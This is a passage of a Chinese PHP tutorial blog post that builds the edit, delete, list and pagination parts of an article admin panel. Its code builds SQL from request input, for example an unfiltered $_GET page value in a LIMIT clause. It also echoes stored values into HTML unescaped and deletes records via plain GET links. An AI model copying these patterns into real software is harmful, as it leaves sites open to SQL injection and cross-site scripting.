alt="image-20210713202759061"></p><h2 id="文章模块修改功能编写"><a href="#文章模块修改功能编写" class="headerlink" title="文章模块修改功能编写"></a>文章模块修改功能编写</h2><p>article_edit.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'init.php';$id=filterstr($_GET['id']);$result = $conn-&gt;query("select * from article where id='$id'");$row = $result-&gt;fetch_assoc();if($_POST['sub']){    $title = filterstr($_POST['title']);    $content = filterstr($_POST['content']);    $author = filterstr($_POST['author']);    $keyword = filterstr($_POST['keyword']);    $cateid = filterstr($_POST['cateid']);    $c_time = time();    $conn-&gt;query("update article set title='$title',content='$content',author='$author',keyword='$keyword',c_time=$c_time,cateid=$cateid where id='$id'");    if($conn-&gt;affected_rows){//affected_rows() 函数返回前一次 MySQL 操作所影响的记录行数。        echo "修改成功";    }else{        echo "修改失败";    }}?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset="UTF-8"/&gt;    &lt;title&gt;后台管理&lt;/title&gt;    &lt;link rel="stylesheet" type="text/css" href="css/common.css"/&gt;    &lt;link rel="stylesheet" type="text/css" href="css/main.css"/&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="topbar-wrap white"&gt;    &lt;div class="topbar-inner clearfix"&gt;        &lt;div class="topbar-logo-wrap clearfix"&gt;            &lt;h1 class="topbar-logo none"&gt;&lt;a href="index.html" class="navbar-brand"&gt;后台管理&lt;/a&gt;&lt;/h1&gt;            &lt;ul class="navbar-list clearfix"&gt;                &lt;li&gt;&lt;a class="on" href="index.html"&gt;首页&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#" target="_blank"&gt;网站首页&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class="top-info-wrap"&gt;            &lt;ul class="top-info-list clearfix"&gt;                &lt;li&gt;&lt;a href="#"&gt;管理员&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;修改密码&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;退出&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div class="container clearfix"&gt;    &lt;div class="sidebar-wrap"&gt;        &lt;div class="sidebar-title"&gt;            &lt;h1&gt;菜单&lt;/h1&gt;        &lt;/div&gt;        &lt;div class="sidebar-content"&gt;            &lt;ul class="sidebar-list"&gt;                &lt;li&gt;                    &lt;a href="#"&gt;&lt;i class="icon-font"&gt;&amp;#xe003;&lt;/i&gt;常用操作&lt;/a&gt;                    &lt;ul class="sub-menu"&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe008;&lt;/i&gt;作品管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe005;&lt;/i&gt;博文管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe006;&lt;/i&gt;分类管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe004;&lt;/i&gt;留言管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe012;&lt;/i&gt;评论管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe052;&lt;/i&gt;友情链接&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe033;&lt;/i&gt;广告管理&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;a href="#"&gt;&lt;i class="icon-font"&gt;&amp;#xe018;&lt;/i&gt;系统管理&lt;/a&gt;                    &lt;ul class="sub-menu"&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe017;&lt;/i&gt;系统设置&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe037;&lt;/i&gt;清理缓存&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe046;&lt;/i&gt;数据备份&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe045;&lt;/i&gt;数据还原&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="/jscss/admin/design/"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;a class="crumb-name" href="/jscss/admin/design/"&gt;作品管理&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span&gt;新增作品&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;div class="result-content"&gt;                &lt;form action="" method="post" id="myform" name="myform" enctype="multipart/form-data"&gt;                    &lt;table class="insert-tab" width="100%"&gt;                        &lt;tbody&gt;&lt;tr&gt;                            &lt;th width="120"&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;分类：&lt;/th&gt;                            &lt;td&gt;                                &lt;select name="cateid" id="cateid" class="required"&gt;                                    &lt;option value=""&gt;请选择&lt;/option&gt;                                    &lt;?php                                    $cate_result=$conn-&gt;query("select * from cate");                                    while($row1= $cate_result-&gt;fetch_assoc()){                                        $selected = $row['cateid'] == $row1['id']?"selected":null;                                        var_dump($selected);                                        ?&gt;                                        &lt;option &lt;?php echo $selected; ?&gt; value="&lt;?php echo $row1['id'];?&gt;"&gt;&lt;?php echo $row1['class_name'];?&gt;&lt;/option&gt;                                        &lt;?php                                   }                                    ?&gt;                                &lt;/select&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;标题：&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="common-text required" id="title" name="title" size="50" value="&lt;?php echo $row['title'];?&gt;" type="text"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;作者：&lt;/th&gt;                            &lt;td&gt;&lt;input class="common-text" name="author" size="50" value="&lt;?php echo $row['author'];?&gt;" type="text" &gt;&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;关键字：&lt;/th&gt;                            &lt;td&gt;&lt;input class="common-text" name="keyword" size="50" value="&lt;?php echo $row['keyword'];?&gt;" type="text"placeholder="请输入关键词以空格或逗号隔开"&gt;&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;内容：&lt;/th&gt;                            &lt;td&gt;&lt;textarea name="content" id="EditorId" class="common-textarea" id="content"  cols="30" style="width: 98%;" rows="10"&gt;&lt;?php echo $row['content'];?&gt;&lt;/textarea&gt;&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="btn btn-primary btn6 mr10" value="提交"  name="sub" type="submit"&gt;                                &lt;input class="btn btn6" onClick="history.go(-1)" value="返回" type="button"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;/tbody&gt;&lt;/table&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;script type="text/javascript" src="ueditor/ueditor.config.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="ueditor/ueditor.all.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="ueditor/lang/zh-cn/zh-cn.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" charset="utf-8"&gt;//初始化编辑器    window.UEDITOR_HOME_URL = "ueditor/";//配置路径设定为UEditor所放的位置    window.onload=function(){        /* window.UEDITOR_CONFIG.initialFrameHeight=600;//编辑器的高度*/        /* window.UEDITOR_CONFIG.initialFrameWidth=1200;//编辑器的宽度*/        var editor = new UE.ui.Editor({            imageUrl : '',            fileUrl : '',            imagePath : '',            filePath : '',            imageManagerUrl:'', //图片在线管理的处理地址            imageManagerPath:''        });        editor.render("EditorId");//此处的EditorId与&lt;textarea name="content" id="EditorId"&gt;的id值对应 &lt;/textarea&gt;    }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在列表里点击修改</p><blockquote><p>这里点击完之后需要手动填写id值</p><p>后来发现原来是在修改的a标签里id没有获取到值</p></blockquote><p><img src="/2021/07/13/60-zhi-day9/image-20210713202834478.png" alt="image-20210713202834478"></p><h2 id="文章模块的删除和查询及文章分类的编写"><a href="#文章模块的删除和查询及文章分类的编写" class="headerlink" title="文章模块的删除和查询及文章分类的编写"></a>文章模块的删除和查询及文章分类的编写</h2><p>删除：我们需要使用sql语句进行删除，定义del方法，点击a标签删除时让他执行del方法即可</p><p>分类：增加一个th即可，后写td输出class_name即可</p><p>article_list.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';include_once '../common/Page.class.php';$page = isset($_GET['page'])?$_GET['page']:1;$subPages=4;if($_GET['action']=='del'){    $id=filterstr($_GET['id']);    $conn-&gt;query("delete from article where id='$id'");    if($conn-&gt;affected_rows&gt;0){        redirect('2','article_list.php','删除成功');    }else{        redirect('2','article_list.php','删除失败');    }}?&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="index.html"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span class="crumb-name"&gt;作品管理&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;form name="myform" id="myform" method="post"&gt;                &lt;div class="result-title"&gt;                    &lt;div class="result-list"&gt;                        &lt;a href="article_add.php"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;新增作品&lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                &lt;div class="result-content"&gt;                    &lt;table class="result-tab" width="100%"&gt;                        &lt;tr&gt;                            &lt;th&gt;ID&lt;/th&gt;                            &lt;th&gt;标题&lt;/th&gt;                            &lt;th&gt;点击&lt;/th&gt;                            &lt;th&gt;发布人&lt;/th&gt;                            &lt;th&gt;分类&lt;/th&gt;                            &lt;th&gt;更新时间&lt;/th&gt;                            &lt;th&gt;操作&lt;/th&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                        &lt;?php                        $result = $conn-&gt;query("select a.id,a.title,a.n,a.author,b.class_name,a.c_time from article as a,cate as b where a.cateid=b.id order by a.id desc limit $page,$subPages");                        $result_count = $result-&gt;num_rows;                        while ($row=$result-&gt;fetch_assoc()){                        ?&gt;                            &lt;td&gt;&lt;?php echo $row['id']?&gt;&lt;/td&gt;                            &lt;td title="&lt;?php echo $row['title']?&gt;"&gt;&lt;a target="_blank"  href="article_edit.php?id=&lt;?php echo $row['id'];?&gt;"title="&lt;?php echo $row['title']?&gt;"&gt;&lt;?php echo $row['title']?&gt;&lt;/a&gt;                            &lt;/td&gt;                            &lt;td&gt;&lt;?php echo $row['n']?&gt;&lt;/td&gt;                            &lt;td&gt;&lt;?php echo $row['author']?&gt;&lt;/td&gt;                            &lt;td&gt;&lt;?php echo $row['class_name']?&gt;&lt;/td&gt;                            &lt;td&gt;&lt;?php echo date("Y-m-d H:i:s",$row['c_time'])?&gt;&lt;/td&gt;                            &lt;td&gt;                                &lt;a class="link-update" href="article_edit.php?id=&lt;?php echo $row['id'];?&gt;"&gt;修改&lt;/a&gt;                                &lt;a class="link-del" href="javascript:del(&lt;?php echo $row['id'];?&gt;);"&gt;删除&lt;/a&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;?php                        }                        ?&gt;                    &lt;/table&gt;                    &lt;div class="list-page"&gt;                        &lt;?php                        $result_2=$conn-&gt;query("select * from article  as a,cate as b where a.cateid=b.id order by a.id desc ");                        $result_count=$result_2-&gt;num_rows;                        $p= new Page($result_count,4,$page,$subPages);                        echo $p-&gt;showPages(1);                        ?&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;script&gt;    function del(id){        if(false==confirm("是否确定删除此篇文章？")) return;        location.href='?action=del&amp;id='+id;    }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210714171500275.png" alt="image-20210714171500275"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714171506499.png" alt="image-20210714171506499"></p><h2 id="文章列表模块分页的编写"><a href="#文章列表模块分页的编写" class="headerlink" title="文章列表模块分页的编写"></a>文章列表模块分页的编写</h2><p>我们引入Page.class.php作为页面计算</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * 分页类 * * 调用方式： * $p=new Page(总条数,显示页数,当前页码,每页显示条数,[链接]); * print_r($p-&gt;getPages()); //生成一个页码数组（键为页码，值为链接） * echo $p-&gt;showPages(1);  //生成一个页码样式（可添加自定义样式） * */</span><span class="token comment">/*总条数，需要显示的页数，当前页，每页显示的条数，连接生成一个一维数组，键为页码 值为连接返回一个生成好样式的页码（并且可以根据自己需要添加样式）默认样式 共45条记录,每页显示10条,当前第1/4页 [首页] [上页] [1] [2] [3] .. [下页] [尾页]*/</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Page</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$count</span><span class="token punctuation">;</span>    <span class="token comment">//总条数</span>    <span class="token keyword">protected</span> <span class="token variable">$showPages</span><span class="token punctuation">;</span>  <span class="token comment">//需要显示的页数</span>    <span class="token keyword">protected</span> <span class="token variable">$countPages</span><span class="token punctuation">;</span> <span class="token comment">//总页数</span>    <span class="token keyword">protected</span> <span class="token variable">$currPage</span><span class="token punctuation">;</span>  <span class="token comment">//当前页</span>    <span class="token keyword">protected</span> <span class="token variable">$subPages</span><span class="token punctuation">;</span>  <span class="token comment">//每页显示条数</span>    <span class="token keyword">protected</span> <span class="token variable">$href</span><span class="token punctuation">;</span>    <span class="token comment">//连接</span>    <span class="token keyword">protected</span> <span class="token variable">$page_arr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//保存生成的页码 键页码 值为连接</span>    <span class="token comment">/**     * __construct 构造函数（获取分页所需参数）     * @param int $count   总条数     * @param int $showPages 显示页数     * @param int $currPage 当前页数     * @param int $subPages 每页显示数量     * @param string $href  连接（不设置则获取当前URL）     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">,</span><span class="token variable">$showPages</span><span class="token punctuation">,</span><span class="token variable">$currPage</span><span class="token punctuation">,</span><span class="token variable">$subPages</span><span class="token punctuation">,</span><span class="token variable">$href</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">=</span><span class="token variable">$count</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">showPages</span><span class="token operator">=</span><span class="token variable">$showPages</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">currPage</span><span class="token operator">=</span><span class="token variable">$currPage</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">subPages</span><span class="token operator">=</span><span class="token variable">$subPages</span><span class="token punctuation">;</span>        <span class="token comment">//如果链接没有设置则获取当前连接</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$href</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">href</span><span class="token operator">=</span><span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">href</span><span class="token operator">=</span><span class="token variable">$href</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">construct_Pages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * getPages 返回页码数组     * @return array 一维数组 键为页码 值为链接     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getPages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">page_arr</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * showPages 返回生成好的页码     * @param int $style 样式     * @return string   生成好的页码     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">showPages</span><span class="token punctuation">(</span><span class="token variable">$style</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$func</span><span class="token operator">=</span><span class="token string single-quoted-string">'pageStyle'</span><span class="token operator">.</span><span class="token variable">$style</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * pageStyle1 分页样式（可参照这个添加自定义样式 例如pageStyle2（））     * 样式 共45条记录,每页显示10条,当前第1/4页 [首页] [上页] [1] [2] [3] .. [下页] [尾页]     * @return string     */</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">pageStyle1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/* 构造普通模式的分页        共4523条记录,每页显示10条,当前第1/453页 [首页] [上页] [1] [2] [3] .. [下页] [尾页]        */</span>        <span class="token variable">$pageStr</span><span class="token operator">=</span><span class="token string single-quoted-string">'共'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">.</span><span class="token string single-quoted-string">'条记录，每页显示'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">subPages</span><span class="token operator">.</span><span class="token string single-quoted-string">'条'</span><span class="token punctuation">;</span>        <span class="token variable">$pageStr</span><span class="token operator">.=</span><span class="token string single-quoted-string">'当前第'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">currPage</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">countPages</span><span class="token operator">.</span><span class="token string single-quoted-string">'页 '</span><span class="token punctuation">;</span>        <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$pageStr</span><span class="token operator">.=</span><span class="token string single-quoted-string">'&lt;span&gt;[&lt;a href="'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">href</span><span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" rel="external nofollow" rel="external nofollow" rel="external nofollow" rel="external nofollow" &gt;首页&lt;/a&gt;] &lt;/span&gt;'</span><span class="token punctuation">;</span>        <span class="token comment">//如果当前页不是第一页就显示上页</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">currPage</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">currPage</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token variable">$pageStr</span><span class="token operator">.=</span><span class="token string single-quoted-string">'&lt;span&gt;[&lt;a href="'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">href</span><span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" rel="external nofollow" rel="external nofollow" rel="external nofollow" rel="external nofollow" &gt;上页&lt;/a&gt;] &lt;/span&gt;'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">page_arr</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$k</span><span class="token punctuation">;</span>            <span class="token variable">$pageStr</span><span class="token operator">.=</span><span class="token string single-quoted-string">'&lt;span&gt;[&lt;a href="'</span><span class="token operator">.</span><span class="token variable">$v</span><span class="token operator">.</span><span class="token string single-quoted-string">'" rel="external nofollow" &gt;'</span><span class="token operator">.</span><span class="token variable">$k</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/a&gt;] &lt;/span&gt;'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//如果当前页小于总页数就显示下一页</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">currPage</span><span class="token operator">&lt;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">countPages</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">currPage</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token variable">$pageStr</span><span class="token operator">.=</span><span class="token string single-quoted-string">'&lt;span&gt;[&lt;a href="'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">href</span><span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" rel="external nofollow" rel="external nofollow" rel="external nofollow" rel="external nofollow" &gt;下页&lt;/a&gt;] &lt;/span&gt;'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">countPages</span><span class="token punctuation">;</span>        <span class="token variable">$pageStr</span><span class="token operator">.=</span><span class="token string single-quoted-string">'&lt;span&gt;[&lt;a href="'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">href</span><span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" rel="external nofollow" rel="external nofollow" rel="external nofollow" rel="external nofollow" &gt;尾页&lt;/a&gt;] &lt;/span&gt;'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$pageStr</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * construct_Pages 生成页码数组     * 键为页码，值为链接     * $this-&gt;page_arr=Array(     *         [1] =&gt; index.php?page=1     *         [2] =&gt; index.php?page=2     *         [3] =&gt; index.php?page=3     *         ......)     */</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">construct_Pages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//计算总页数</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">countPages</span><span class="token operator">=</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">/</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">subPages</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//根据当前页计算前后页数</span>        <span class="token variable">$leftPage_num</span><span class="token operator">=</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">showPages</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$rightPage_num</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">showPages</span><span class="token operator">-</span><span class="token variable">$leftPage_num</span><span class="token punctuation">;</span>        <span class="token comment">//左边显示数为当前页减左边该显示的数 例如总显示7页 当前页是5 左边最小为5-3 右边为5+3</span>        <span class="token variable">$left</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">currPage</span><span class="token operator">-</span><span class="token variable">$leftPage_num</span><span class="token punctuation">;</span>        <span class="token variable">$left</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//左边最小不能小于1</span>        <span class="token variable">$right</span><span class="token operator">=</span><span class="token variable">$left</span><span class="token operator">+</span><span class="token variable">$this</span><span class="token 